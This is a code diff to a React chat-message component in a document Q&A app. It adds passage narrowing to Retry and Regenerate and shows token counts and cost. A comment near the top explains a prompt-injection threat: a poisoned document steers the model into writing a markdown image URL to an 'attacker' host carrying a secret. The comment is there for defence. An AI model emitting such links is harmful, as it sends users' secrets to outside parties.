@@ -6,6 +6,7 @@ import type {
   DocumentTask,
   FeedbackKind,
   FeedbackRating,
+  PassageNarrowing,
   SummaryCoverage,
   TimingsResponse,
 } from '../api/types';
@@ -21,6 +22,7 @@ import './ChatMessage.css';
 import { isImeComposing } from '../utils/keyboard';
 import { enterAddsNewline } from '../utils/platform';
 import { MAX_QUESTION_CHARS } from '../utils/limits';
+import { formatCost } from '../utils/cost';
 
 // Answers quote retrieved documents, and a poisoned document can steer the model into
 // writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
@@ -131,6 +133,9 @@ export interface ChatTurn {
   // A whole-document task (summary, comparison) rather than a question: on the user
   // turn that asked it, and on its error turn, so Retry and Regenerate repeat the task.
   task?: DocumentTask;
+  // Where the question looked (picked passages, pages, a section): on the user turn and
+  // its error turn, so Retry and Regenerate look there again.
+  narrowing?: PassageNarrowing;
   // A summary that read only part of a long document (evenly spaced passages).
   coverage?: SummaryCoverage;
   // Questions the server suggests asking next (FOLLOWUPS_ENABLED).
@@ -146,7 +151,7 @@ export interface ChatTurn {
   // model was told match only weakly.
   weakMatch?: boolean;
   // Tokens the provider reported for this answer.
-  usage?: { prompt: number; completion: number };
+  usage?: { prompt: number; completion: number; costUsd?: number };
   // A "not found" answer's passages: what the model read and found no answer in (text
   // left out; opened by chunk id).
   contextSources?: CitationResponse[];
@@ -168,9 +173,9 @@ interface ChatMessageProps {
   streamEtaMs?: number | null;
   currentModelLabel?: string;
   // `task`: the whole-document task the question was (a summary), repeated as one.
-  onRetry?: (question: string, task?: DocumentTask) => void;
+  onRetry?: AskAgain;
   // Regenerate skips the server's answer cache; onRetry is used when this is absent.
-  onRegenerate?: (question: string, task?: DocumentTask) => void;
+  onRegenerate?: AskAgain;
   // Edit a user turn and ask again (a fork — the original conversation is kept).
   onEditQuestion?: (turnId: string, question: string) => void;
   // The question a "Regenerate" click on this (assistant) turn should re-ask —
@@ -179,6 +184,7 @@ interface ChatMessageProps {
   regenerateQuestion?: string;
   // The task of that question, when it was a summary or comparison.
   regenerateTask?: DocumentTask;
+  regenerateNarrowing?: PassageNarrowing;
   // Off (undefined/false) unless the server has AppSettings.feedback_enabled set —
   // sourced from PublicConfigResponse.feedback_enabled via App.tsx.
   feedbackEnabled?: boolean;
@@ -233,13 +239,19 @@ function groundingNotes(turn: ChatTurn): string[] {
   return notes;
 }
 
-/** Ask again, naming the task only when there is one (a plain question keeps its call). */
+/** Ask a question again: its task (a summary) and its narrowing, when it had them. */
+export type AskAgain = (question: string, task?: DocumentTask, narrowing?: PassageNarrowing) => void;
+
+/** Ask again, naming the task and narrowing only when there are some (a plain
+ *  question keeps its one-argument call). */
 function askAgain(
-  ask: (question: string, task?: DocumentTask) => void,
+  ask: AskAgain,
   question: string,
   task: DocumentTask | undefined,
+  narrowing?: PassageNarrowing,
 ): void {
-  if (task) ask(question, task);
+  if (narrowing) ask(question, task, narrowing);
+  else if (task) ask(question, task);
   else ask(question);
 }
 
@@ -261,6 +273,7 @@ function ChatMessage({
   onEditQuestion,
   regenerateQuestion,
   regenerateTask,
+  regenerateNarrowing,
   feedbackEnabled,
   onFeedback,
   onOpenSource,
@@ -476,7 +489,7 @@ function ChatMessage({
             </form>
           ) : (
             <>
-              <p className="chat-message__question">{turn.content}</p>
+              <p className="chat-message__question" dir="auto">{turn.content}</p>
               {/* A summary's text is a label, not the request: editing it would send a
                   plain question, so summaries are asked again from the corpus panel. */}
               {onEditQuestion && !turn.task && (
@@ -507,7 +520,7 @@ function ChatMessage({
           <button
             type="button"
             className="chat-message__action"
-            onClick={() => !busy && askAgain(onRetry, turn.content, turn.task)}
+            onClick={() => !busy && askAgain(onRetry, turn.content, turn.task, turn.narrowing)}
             aria-disabled={busy || undefined}
             data-testid="chat-message-ask-again"
           >
@@ -521,7 +534,7 @@ function ChatMessage({
           <span className="chat-message__gutter chat-message__gutter--answer" aria-hidden="true">
             A
           </span>
-          <div className="chat-message__answer">
+          <div className="chat-message__answer" dir="auto">
             {showSkeleton ? (
               <StreamingSkeleton stage={streamStage} startedAt={streamStartedAt} etaMs={streamEtaMs} />
             ) : (
@@ -653,7 +666,8 @@ function ChatMessage({
                   className="chat-message__regenerate"
                   aria-disabled={busy || undefined}
                   onClick={() =>
-                    !busy && askAgain(onRegenerate ?? onRetry, regenerateQuestion, regenerateTask)
+                    !busy &&
+                    askAgain(onRegenerate ?? onRetry, regenerateQuestion, regenerateTask, regenerateNarrowing)
                   }
                   data-testid="chat-message-regenerate"
                 >
@@ -791,6 +805,12 @@ function ChatMessage({
               <div className="chat-message__engineer-meta mono">
                 <span>{formatDuration(timings.total_ms)}</span>
                 {(turn.model ?? currentModelLabel) && <span>{turn.model ?? currentModelLabel}</span>}
+                {turn.usage && (
+                  <span data-testid="chat-message-usage">
+                    {turn.usage.prompt + turn.usage.completion} tokens
+                    {turn.usage.costUsd !== undefined ? ` · ${formatCost(turn.usage.costUsd)}` : ''}
+                  </span>
+                )}
               </div>
             )}
           </div>
@@ -812,7 +832,7 @@ function ChatMessage({
                 type="button"
                 className="chat-message__retry"
                 aria-disabled={busy || undefined}
-                onClick={() => !busy && askAgain(onRetry, turn.question!, turn.task)}
+                onClick={() => !busy && askAgain(onRetry, turn.question!, turn.task, turn.narrowing)}
                 data-testid="chat-message-retry"
               >
                 Retry
